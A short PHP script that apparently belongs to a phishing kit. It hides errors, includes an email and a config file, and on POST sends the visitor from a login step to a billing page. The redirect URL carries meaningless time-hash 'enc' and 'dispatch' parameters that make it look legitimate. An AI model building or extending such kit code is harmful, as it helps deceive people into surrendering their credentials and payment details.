<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../config2.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
header('location: ../billing.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>